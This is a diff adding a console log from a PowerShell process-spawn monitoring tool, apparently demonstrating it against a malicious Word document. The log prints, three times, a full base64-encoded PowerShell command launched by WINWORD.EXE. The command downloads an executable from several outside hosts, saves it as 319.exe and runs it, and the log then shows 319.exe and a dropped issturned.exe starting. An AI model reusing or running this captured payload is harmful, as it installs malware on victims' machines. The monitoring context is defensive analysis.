@@ -1,0 +1,634 @@
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> cd C:\Users\Admin\Downloads\ProcessSpawnControl-master
+PS C:\Users\Admin\Downloads\ProcessSpawnControl-master> .\ProcessSpawnControl.ps1
+Monitoring newly spawned processes via WMI...
+
+(1) New process spawned:
+PID:             2960
+Name:            Wireshark.exe
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Program Files\Wireshark\Wireshark.exe"
+Trying to suspend process: 2960
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 2960
+
+(2) New process spawned:
+PID:             1096
+Name:            dumpcap.exe
+PPID:            2960
+Parent name:     Wireshark
+CommandLine:     "C:\Program Files\Wireshark\dumpcap.exe" -S -Z 2960.dummy
+Trying to suspend process: 1096
+Process is suspended. Creating GUI popup.
+
+(3) New process spawned:
+PID:             3660
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(4) New process spawned:
+PID:             2076
+Name:            dumpcap.exe
+PPID:            2960
+Parent name:     Wireshark
+CommandLine:     "C:\Program Files\Wireshark\dumpcap.exe" -n -i \Device\NPF_{C2458BA6-57E4-41A9-AA0A-03AD788624B2} -y EN
+10MB -Z 2960
+Trying to suspend process: 2076
+Process is suspended. Creating GUI popup.
+
+(5) New process spawned:
+PID:             3444
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+Trying to resume process: 2076
+
+(6) New process spawned:
+PID:             1468
+Name:            SearchProtocolHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipe
+MssGthrPipe6 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search
+ 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+Process ignored as per configuration.
+
+(7) New process spawned:
+PID:             2492
+Name:            WINWORD.EXE
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\Admin\Desktop\Order 18
+4-1748378-0895603.doc" /o "u"
+Trying to suspend process: 2492
+Process is suspended. Creating GUI popup.
+
+(8) New process spawned:
+PID:             2812
+Name:            SearchFilterHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchFilterHost.exe" 0 516 520 528 65536 524
+Process ignored as per configuration.
+
+Trying to resume process: 2492
+
+(9) New process spawned:
+PID:             992
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(10) New process spawned:
+PID:             2544
+Name:            OSPPSVC.EXE
+PPID:            484
+Parent name:     services
+CommandLine:     "c:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE"
+Trying to suspend process: 2544
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 2544
+
+(11) New process spawned:
+PID:             3492
+Name:            WINWORD.EXE
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\Admin\Desktop\Order 18
+4-1748378-0895603.doc" /o "u"
+Trying to suspend process: 3492
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 3492
+
+(12) New process spawned:
+PID:             2968
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(13) New process spawned:
+PID:             1324
+Name:            powershell.exe
+PPID:            3492
+Parent name:     WINWORD
+CommandLine:     Powershell -e JABqADQAQwBuADYASgB6AD0AKAAnAEQAJwArACcAQQBvAEYASwAnACsAJwBCAHcAVgAnACkAOwAkAG4AQgBPAEsAN
+wBZAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQATwBoAEgAbABDADcAagB0AD0AKAAnAGgAdAB0AHAAO
+gAnACsAJwAvAC8AJwArACcAbQBlAG0AdAByAGUAJwArACcAYQB0ACcAKwAnAC4AYwBvAG0ALwBUAE8AJwArACcAbgA5ACcAKwAnAEsANQAnACsAJwAxAFEAS
+wAxAHAASgAyAHEASQAnACsAJwBfAFMASwBhAGUAYgBGAEEAegAnACsAJwBAAGgAJwArACcAdAB0AHAAOgAnACsAJwAvAC8AbQBlAGQAbwAnACsAJwBuAGcAa
+ABvAC4AdgAnACsAJwBuAC8AUwBWAG0ANQB5AEMAMABzACcAKwAnAHcAXwBDAHgAQABoAHQAdABwADoALwAnACsAJwAvAG8AJwArACcAdABvAGoAYQBjAGsAL
+gAnACsAJwBjACcAKwAnAG8ALgAnACsAJwBpAGQAJwArACcALwB3AHAALQBjAG8AJwArACcAbgB0AGUAbgB0AC8AdQAnACsAJwBwAGwAJwArACcAbwBhAGQAc
+wAvAHgAdgAnACsAJwBWAFEAYwAyAFIAegBkAEQAaAAnACsAJwBUAFcAcwB3AFYAJwArACcAYQAnACsAJwBAAGgAdAB0ACcAKwAnAHAAOgAvAC8AcAAnACsAJ
+wB0AG0AbQBmAC4AYwBvAC4AaQAnACsAJwBkAC8AdQBOAFYATQBQAEUATABUAFEAXwBsACcAKwAnAGQAJwArACcAUQBAAGgAdAAnACsAJwB0AHAAOgAvAC8Ac
+ABvAHQAbAAnACsAJwBhAGMAawAnACsAJwBhAHIAaQAnACsAJwBlAHQAJwArACcALgBzAGsALwBiAFgAZgBrACcAKwAnAEoAJwArACcAMgBTAGUASwBkACcAK
+wAnADcAJwArACcAZwAnACkALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABNAHEARABXAEMAVABqAD0AKAAnAHUAdwB6AHcAJwArACcAMgB6ACcAKQA7ACQAe
+gBHADgAVQBaAG8AOAAgAD0AIAAoACcAMwAxACcAKwAnADkAJwApADsAJABWAE0AUQBOAHIAUgBLAD0AKAAnAHYANgA3AGYARQBqACcAKwAnAGsAJwArACcAU
+gAnACkAOwAkAEMASABaAEMAMQBFAFAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAHoARwA4AFUAWgBvADgAKwAoACcAL
+gBlACcAKwAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABLAGIAdQBYAEoAMAAgAGkAbgAgACQATwBoAEgAbABDADcAagB0ACkAewB0AHIAeQB7ACQAb
+gBCAE8ASwA3AFkAWQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABLAGIAdQBYAEoAMAAsACAAJABDAEgAWgBDADEARQBQACkAOwAkAGIAMABVAFkAa
+gBtAFAAPQAoACcATAB3AFIAMgAnACsAJwA5ACcAKwAnAFIAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAQwBIAFoAQwAxAEUAUAApAC4Ab
+ABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEMASABaAEMAMQBFAFAAOwAkAEcAQQAwAHYAT
+ABEAFUAbQA9ACgAJwBVAHIAUQBNACcAKwAnAGsASgAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAYwBGAHcAdABsAGMAUgA9ACgAJ
+wBKAG0ARQA5AE4AJwArACcASgBtAGQAJwApADsA
+Trying to suspend process: 1324
+Process is suspended. Creating GUI popup.
+
+(14) New process spawned:
+PID:             3768
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+Trying to resume process: 1324
+
+(15) New process spawned:
+PID:             1920
+Name:            319.exe
+PPID:            336
+Parent name:     unknown
+CommandLine:     "C:\Users\Admin\319.exe"
+Trying to suspend process: 1920
+Process is suspended. Creating GUI popup.
+
+(16) New process spawned:
+PID:             3960
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(17) New process spawned:
+PID:             1348
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(18) New process spawned:
+PID:             3808
+Name:            SearchProtocolHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe7_ Global\UsGthrCtrlFltPipe
+MssGthrPipe7 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search
+ 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+Process ignored as per configuration.
+
+(19) New process spawned:
+PID:             2644
+Name:            SearchFilterHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchFilterHost.exe" 0 516 520 528 65536 524
+Process ignored as per configuration.
+
+(20) New process spawned:
+PID:             948
+Name:            WinMD5.exe
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Users\Admin\Desktop\WinMD5.exe"
+Trying to suspend process: 948
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 948
+
+(21) New process spawned:
+PID:             3564
+Name:            319.exe
+PPID:            3024
+Parent name:     unknown
+CommandLine:     "C:\Users\Admin\319.exe"
+Trying to suspend process: 3564
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 3564
+
+(22) New process spawned:
+PID:             1992
+Name:            WINWORD.EXE
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\Admin\Desktop\Order 18
+4-1748378-0895603.doc" /o "u"
+Trying to suspend process: 1992
+Process is suspended. Creating GUI popup.
+
+(23) New process spawned:
+PID:             3388
+Name:            SearchProtocolHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipe
+MssGthrPipe8 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search
+ 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+Process ignored as per configuration.
+
+(24) New process spawned:
+PID:             2124
+Name:            SearchFilterHost.exe
+PPID:            224
+Parent name:     SearchIndexer
+CommandLine:     "C:\Windows\system32\SearchFilterHost.exe" 0 516 520 528 65536 524
+Process ignored as per configuration.
+
+(25) New process spawned:
+PID:             3628
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+Trying to resume process: 1992
+
+(26) New process spawned:
+PID:             1764
+Name:            powershell.exe
+PPID:            1992
+Parent name:     WINWORD
+CommandLine:     Powershell -e JABqADQAQwBuADYASgB6AD0AKAAnAEQAJwArACcAQQBvAEYASwAnACsAJwBCAHcAVgAnACkAOwAkAG4AQgBPAEsAN
+wBZAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQATwBoAEgAbABDADcAagB0AD0AKAAnAGgAdAB0AHAAO
+gAnACsAJwAvAC8AJwArACcAbQBlAG0AdAByAGUAJwArACcAYQB0ACcAKwAnAC4AYwBvAG0ALwBUAE8AJwArACcAbgA5ACcAKwAnAEsANQAnACsAJwAxAFEAS
+wAxAHAASgAyAHEASQAnACsAJwBfAFMASwBhAGUAYgBGAEEAegAnACsAJwBAAGgAJwArACcAdAB0AHAAOgAnACsAJwAvAC8AbQBlAGQAbwAnACsAJwBuAGcAa
+ABvAC4AdgAnACsAJwBuAC8AUwBWAG0ANQB5AEMAMABzACcAKwAnAHcAXwBDAHgAQABoAHQAdABwADoALwAnACsAJwAvAG8AJwArACcAdABvAGoAYQBjAGsAL
+gAnACsAJwBjACcAKwAnAG8ALgAnACsAJwBpAGQAJwArACcALwB3AHAALQBjAG8AJwArACcAbgB0AGUAbgB0AC8AdQAnACsAJwBwAGwAJwArACcAbwBhAGQAc
+wAvAHgAdgAnACsAJwBWAFEAYwAyAFIAegBkAEQAaAAnACsAJwBUAFcAcwB3AFYAJwArACcAYQAnACsAJwBAAGgAdAB0ACcAKwAnAHAAOgAvAC8AcAAnACsAJ
+wB0AG0AbQBmAC4AYwBvAC4AaQAnACsAJwBkAC8AdQBOAFYATQBQAEUATABUAFEAXwBsACcAKwAnAGQAJwArACcAUQBAAGgAdAAnACsAJwB0AHAAOgAvAC8Ac
+ABvAHQAbAAnACsAJwBhAGMAawAnACsAJwBhAHIAaQAnACsAJwBlAHQAJwArACcALgBzAGsALwBiAFgAZgBrACcAKwAnAEoAJwArACcAMgBTAGUASwBkACcAK
+wAnADcAJwArACcAZwAnACkALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABNAHEARABXAEMAVABqAD0AKAAnAHUAdwB6AHcAJwArACcAMgB6ACcAKQA7ACQAe
+gBHADgAVQBaAG8AOAAgAD0AIAAoACcAMwAxACcAKwAnADkAJwApADsAJABWAE0AUQBOAHIAUgBLAD0AKAAnAHYANgA3AGYARQBqACcAKwAnAGsAJwArACcAU
+gAnACkAOwAkAEMASABaAEMAMQBFAFAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAHoARwA4AFUAWgBvADgAKwAoACcAL
+gBlACcAKwAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABLAGIAdQBYAEoAMAAgAGkAbgAgACQATwBoAEgAbABDADcAagB0ACkAewB0AHIAeQB7ACQAb
+gBCAE8ASwA3AFkAWQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABLAGIAdQBYAEoAMAAsACAAJABDAEgAWgBDADEARQBQACkAOwAkAGIAMABVAFkAa
+gBtAFAAPQAoACcATAB3AFIAMgAnACsAJwA5ACcAKwAnAFIAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAQwBIAFoAQwAxAEUAUAApAC4Ab
+ABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEMASABaAEMAMQBFAFAAOwAkAEcAQQAwAHYAT
+ABEAFUAbQA9ACgAJwBVAHIAUQBNACcAKwAnAGsASgAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAYwBGAHcAdABsAGMAUgA9ACgAJ
+wBKAG0ARQA5AE4AJwArACcASgBtAGQAJwApADsA
+Trying to suspend process: 1764
+Process is suspended. Creating GUI popup.
+
+(27) New process spawned:
+PID:             3548
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+Trying to resume process: 1764
+
+(28) New process spawned:
+PID:             4024
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(29) New process spawned:
+PID:             3960
+Name:            WINWORD.EXE
+PPID:            2596
+Parent name:     explorer
+CommandLine:     "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\Admin\Desktop\Order 18
+4-1748378-0895603.doc" /o "u"
+Trying to suspend process: 3960
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 3960
+
+(30) New process spawned:
+PID:             2808
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+(31) New process spawned:
+PID:             3208
+Name:            powershell.exe
+PPID:            3960
+Parent name:     WINWORD
+CommandLine:     Powershell -e JABqADQAQwBuADYASgB6AD0AKAAnAEQAJwArACcAQQBvAEYASwAnACsAJwBCAHcAVgAnACkAOwAkAG4AQgBPAEsAN
+wBZAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQATwBoAEgAbABDADcAagB0AD0AKAAnAGgAdAB0AHAAO
+gAnACsAJwAvAC8AJwArACcAbQBlAG0AdAByAGUAJwArACcAYQB0ACcAKwAnAC4AYwBvAG0ALwBUAE8AJwArACcAbgA5ACcAKwAnAEsANQAnACsAJwAxAFEAS
+wAxAHAASgAyAHEASQAnACsAJwBfAFMASwBhAGUAYgBGAEEAegAnACsAJwBAAGgAJwArACcAdAB0AHAAOgAnACsAJwAvAC8AbQBlAGQAbwAnACsAJwBuAGcAa
+ABvAC4AdgAnACsAJwBuAC8AUwBWAG0ANQB5AEMAMABzACcAKwAnAHcAXwBDAHgAQABoAHQAdABwADoALwAnACsAJwAvAG8AJwArACcAdABvAGoAYQBjAGsAL
+gAnACsAJwBjACcAKwAnAG8ALgAnACsAJwBpAGQAJwArACcALwB3AHAALQBjAG8AJwArACcAbgB0AGUAbgB0AC8AdQAnACsAJwBwAGwAJwArACcAbwBhAGQAc
+wAvAHgAdgAnACsAJwBWAFEAYwAyAFIAegBkAEQAaAAnACsAJwBUAFcAcwB3AFYAJwArACcAYQAnACsAJwBAAGgAdAB0ACcAKwAnAHAAOgAvAC8AcAAnACsAJ
+wB0AG0AbQBmAC4AYwBvAC4AaQAnACsAJwBkAC8AdQBOAFYATQBQAEUATABUAFEAXwBsACcAKwAnAGQAJwArACcAUQBAAGgAdAAnACsAJwB0AHAAOgAvAC8Ac
+ABvAHQAbAAnACsAJwBhAGMAawAnACsAJwBhAHIAaQAnACsAJwBlAHQAJwArACcALgBzAGsALwBiAFgAZgBrACcAKwAnAEoAJwArACcAMgBTAGUASwBkACcAK
+wAnADcAJwArACcAZwAnACkALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABNAHEARABXAEMAVABqAD0AKAAnAHUAdwB6AHcAJwArACcAMgB6ACcAKQA7ACQAe
+gBHADgAVQBaAG8AOAAgAD0AIAAoACcAMwAxACcAKwAnADkAJwApADsAJABWAE0AUQBOAHIAUgBLAD0AKAAnAHYANgA3AGYARQBqACcAKwAnAGsAJwArACcAU
+gAnACkAOwAkAEMASABaAEMAMQBFAFAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAHoARwA4AFUAWgBvADgAKwAoACcAL
+gBlACcAKwAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABLAGIAdQBYAEoAMAAgAGkAbgAgACQATwBoAEgAbABDADcAagB0ACkAewB0AHIAeQB7ACQAb
+gBCAE8ASwA3AFkAWQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABLAGIAdQBYAEoAMAAsACAAJABDAEgAWgBDADEARQBQACkAOwAkAGIAMABVAFkAa
+gBtAFAAPQAoACcATAB3AFIAMgAnACsAJwA5ACcAKwAnAFIAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAQwBIAFoAQwAxAEUAUAApAC4Ab
+ABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEMASABaAEMAMQBFAFAAOwAkAEcAQQAwAHYAT
+ABEAFUAbQA9ACgAJwBVAHIAUQBNACcAKwAnAGsASgAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAYwBGAHcAdABsAGMAUgA9ACgAJ
+wBKAG0ARQA5AE4AJwArACcASgBtAGQAJwApADsA
+Trying to suspend process: 3208
+Process is suspended. Creating GUI popup.
+
+(32) New process spawned:
+PID:             4016
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+Trying to resume process: 3208
+
+(33) New process spawned:
+PID:             3268
+Name:            319.exe
+PPID:            3320
+Parent name:     unknown
+CommandLine:     "C:\Users\Admin\319.exe"
+Trying to suspend process: 3268
+Process is suspended. Creating GUI popup.
+
+(34) New process spawned:
+PID:             3912
+Name:            dllhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+Process ignored as per configuration.
+
+Trying to resume process: 3268
+
+(35) New process spawned:
+PID:             4060
+Name:            issturned.exe
+PPID:            1640
+Parent name:     unknown
+CommandLine:     "C:\Users\Admin\AppData\Local\issturned\issturned.exe"
+Trying to suspend process: 4060
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 4060
+
+(36) New process spawned:
+PID:             2068
+Name:            taskeng.exe
+PPID:            864
+Parent name:     svchost
+CommandLine:     taskeng.exe {882C4B26-F9CD-4D03-A6CF-3202FE11EFBD}
+Trying to suspend process: 2068
+Process is suspended. Creating GUI popup.
+
+(37) New process spawned:
+PID:             3364
+Name:            GoogleUpdate.exe
+PPID:            2068
+Parent name:     taskeng
+CommandLine:     "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler
+Trying to suspend process: 3364
+Process is suspended. Creating GUI popup.
+
+(38) New process spawned:
+PID:             892
+Name:            slui.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\System32\slui.exe -Embedding
+Trying to suspend process: 892
+Process is suspended. Creating GUI popup.
+
+(39) New process spawned:
+PID:             2668
+Name:            taskhost.exe
+PPID:            484
+Parent name:     services
+CommandLine:     taskhost.exe $(Arg0)
+Process ignored as per configuration.
+
+(40) New process spawned:
+PID:             1080
+Name:            MpCmdRun.exe
+PPID:            484
+Parent name:     services
+CommandLine:     "c:\program files\windows defender\MpCmdRun.exe" Scan -ScheduleJob -WinTask -RestrictPrivilegesScan
+Trying to suspend process: 1080
+Process is suspended. Creating GUI popup.
+
+(41) New process spawned:
+PID:             2852
+Name:            conhost.exe
+PPID:            328
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(42) New process spawned:
+PID:             1252
+Name:            conhost.exe
+PPID:            328
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(43) New process spawned:
+PID:             2644
+Name:            aitagent.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\aitagent.EXE
+Trying to suspend process: 2644
+Process is suspended. Creating GUI popup.
+
+(44) New process spawned:
+PID:             3092
+Name:            rundll32.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\rundll32.exe aepdu.dll,AePduRunUpdate
+Trying to suspend process: 3092
+Process is suspended. Creating GUI popup.
+
+(45) New process spawned:
+PID:             3556
+Name:            taskhost.exe
+PPID:            484
+Parent name:     services
+CommandLine:     "taskhost.exe"
+Process ignored as per configuration.
+
+(46) New process spawned:
+PID:             3872
+Name:            conhost.exe
+PPID:            328
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(47) New process spawned:
+PID:             3904
+Name:            Defrag.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\defrag.exe -c
+Trying to suspend process: 3904
+Process is suspended. Creating GUI popup.
+
+(48) New process spawned:
+PID:             3156
+Name:            conhost.exe
+PPID:            328
+Parent name:     csrss
+CommandLine:
+Process ignored as per configuration.
+
+(49) New process spawned:
+PID:             784
+Name:            powercfg.exe
+PPID:            484
+Parent name:     services
+CommandLine:
+Suspend-Process : Unable to open process. Not elevated? Process doesn't exist anymore?
+At C:\Users\Admin\Downloads\ProcessSpawnControl-master\ProcessSpawnControl.ps1:307 char:21
++         if(Suspend-Process <<<<  -processID $e.ProcessId){
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Suspend-Process
+
+
+(50) New process spawned:
+PID:             1692
+Name:            lpremove.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\lpremove.exe
+Trying to suspend process: 1692
+Process is suspended. Creating GUI popup.
+
+(51) New process spawned:
+PID:             2668
+Name:            conhost.exe
+PPID:            328
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(52) New process spawned:
+PID:             992
+Name:            rundll32.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\rundll32.exe /d srrstr.dll,ExecuteScheduledSPPCreation
+Trying to suspend process: 992
+Process is suspended. Creating GUI popup.
+
+(53) New process spawned:
+PID:             1760
+Name:            sdiagnhost.exe
+PPID:            596
+Parent name:     svchost
+CommandLine:     C:\Windows\System32\sdiagnhost.exe -Embedding
+Trying to suspend process: 1760
+Process is suspended. Creating GUI popup.
+
+(54) New process spawned:
+PID:             2176
+Name:            rundll32.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
+Trying to suspend process: 2176
+Process is suspended. Creating GUI popup.
+
+(55) New process spawned:
+PID:             3556
+Name:            conhost.exe
+PPID:            388
+Parent name:     csrss
+CommandLine:     \??\C:\Windows\system32\conhost.exe
+Process ignored as per configuration.
+
+(56) New process spawned:
+PID:             3552
+Name:            taskhost.exe
+PPID:            484
+Parent name:     services
+CommandLine:     taskhost.exe $(Arg0)
+Process ignored as per configuration.
+
+(57) New process spawned:
+PID:             3988
+Name:            taskhost.exe
+PPID:            484
+Parent name:     services
+CommandLine:     taskhost.exe C:\Windows\system32\defrag.exe -c
+Process ignored as per configuration.
+
+Trying to resume process: 2176
+
+Trying to resume process: 1760
+
+Trying to resume process: 992
+
+Trying to resume process: 1692
+
+(58) New process spawned:
+PID:             1060
+Name:            VSSVC.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\system32\vssvc.exe
+Trying to suspend process: 1060
+Process is suspended. Creating GUI popup.
+
+Trying to resume process: 1060
+
+(59) New process spawned:
+PID:             3180
+Name:            svchost.exe
+PPID:            484
+Parent name:     services
+CommandLine:     C:\Windows\System32\svchost.exe -k swprv
+Trying to suspend process: 3180
+Process is suspended. Creating GUI popup.
+Trying to resume process: 1080
+
+
+Trying to resume process: 3180
+
+Trying to resume process: 892
+
+(60) New process spawned:
+PID:             3136
+Name:            MpCmdRun.exe
+PPID:            1080
+Parent name:     unknown
+CommandLine:     "c:\program files\windows defender\MpCmdRun.exe" Scan -ScheduleJob -WinTask -RestrictPrivilegesScan -Re
+invoke
+Trying to suspend process: 3136
+Process is suspended. Creating GUI popup.
+
+
+
+
+
+
